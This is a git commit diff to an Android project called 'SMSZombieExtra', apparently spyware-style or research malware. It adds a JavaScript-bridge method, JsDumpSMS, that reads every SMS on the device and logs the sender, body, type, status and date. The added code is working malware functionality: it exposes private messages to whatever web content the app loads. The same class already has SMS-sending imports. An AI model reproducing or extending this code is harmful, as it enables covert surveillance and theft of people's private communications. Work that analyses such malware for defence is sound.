6031c46e318f6da437b8b133e35f4b6f50b6934e
Manwel Bugeja <manwelbugeja@Manwels-MBP-2.lan>
2023-02-27 16:03:22 +0100

    Updated SMS zombie to also dump smses

--- SMSZombieExtra/app/src/main/java/com/example/smszombieextra/JavaScriptInterface.java
+++ SMSZombieExtra/app/src/main/java/com/example/smszombieextra/JavaScriptInterface.java
@@ -1,7 +1,9 @@
 package com.example.smszombieextra;
 
+import android.annotation.SuppressLint;
 import android.app.Activity;
 import android.content.Intent;
+import android.database.Cursor;
 import android.net.Uri;
 import android.telephony.SmsManager;
 import android.util.Log;
@@ -28,6 +30,32 @@ public class JavaScriptInterface {
                 ex.printStackTrace();
             }
         }
+    }
+
+    @SuppressLint("Range")
+    @JavascriptInterface
+    public void JsDumpSMS() {
+        final String address = "address";
+        final String body = "body";
+        final String type = "type";
+        final String status = "status";
+        final String date = "date";
+        final String sms = "content://sms/";
+
+        Uri uriSMSURI = Uri.parse(sms);
+        Cursor cur = activity.getContentResolver()
+                .query(uriSMSURI, null, null, null, null);
+
+        Log.i(TAG, "Dumping SMS: " + cur.getCount());
+        while (cur.moveToNext()) {
+            Log.i(TAG, cur.getString(cur.getColumnIndex(address)));
+            Log.i(TAG, cur.getString(cur.getColumnIndex(body)));
+            Log.i(TAG, cur.getString(cur.getColumnIndex(type)));
+            Log.i(TAG, cur.getString(cur.getColumnIndex(status)));
+            Log.i(TAG, cur.getString(cur.getColumnIndex(date)));
+        }
+
+        cur.close();
     }
 
     @JavascriptInterface
